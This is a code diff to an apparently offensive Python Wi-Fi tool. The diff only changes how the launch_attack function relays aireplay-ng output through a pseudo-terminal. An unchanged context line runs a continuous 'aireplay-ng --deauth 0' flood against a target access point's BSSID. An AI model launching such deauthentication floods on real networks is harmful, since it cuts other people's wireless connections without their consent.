@@ -1,6 +1,7 @@
 import subprocess
 import os
 import pty
+import sys
 import csv
 import time
 import shutil
@@ -291,9 +292,14 @@ def launch_attack(mon_interface, target):
     # give aireplay-ng a real pty instead of a plain pipe for its output —
     # a plain pipe makes it detect a non-terminal and switch to full block
     # buffering, which delays the log by several seconds; a pty keeps it
-    # thinking it's talking to a terminal, so it stays line-buffered. the
-    # log itself just prints and scrolls plainly — no boxed live redraw,
-    # since redrawing a growing box turned out unreliable on real terminals
+    # thinking it's talking to a terminal, so it stays line-buffered.
+    #
+    # the raw bytes are relayed to our own stdout as-is, unmodified — aireplay-ng
+    # formats some of its own output with carriage returns and multi-line
+    # notices, and decoding/splitting/re-prefixing each "line" ourselves broke
+    # that formatting into a misaligned, staggered mess. relaying it untouched
+    # is exactly what you'd see running aireplay-ng directly in a terminal.
+    sys.stdout.flush()
     master_fd, slave_fd = pty.openpty()
     attack_proc = subprocess.Popen(
         ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_interface],
@@ -303,7 +309,6 @@ def launch_attack(mon_interface, target):
     )
     os.close(slave_fd)
 
-    buf = ""
     try:
         while True:
             try:
@@ -312,13 +317,7 @@ def launch_attack(mon_interface, target):
                 break  # the slave side closed once aireplay-ng exited
             if not chunk:
                 break
-
-            buf += chunk.decode("utf-8", errors="replace")
-            *complete_lines, buf = buf.replace("\r\n", "\n").replace("\r", "\n").split("\n")
-            for line in complete_lines:
-                line = line.strip()
-                if line:
-                    print(f"  {banner.C.MUTED}{line}{banner.C.RESET}")
+            os.write(1, chunk)
     except KeyboardInterrupt:
         pass
     finally:
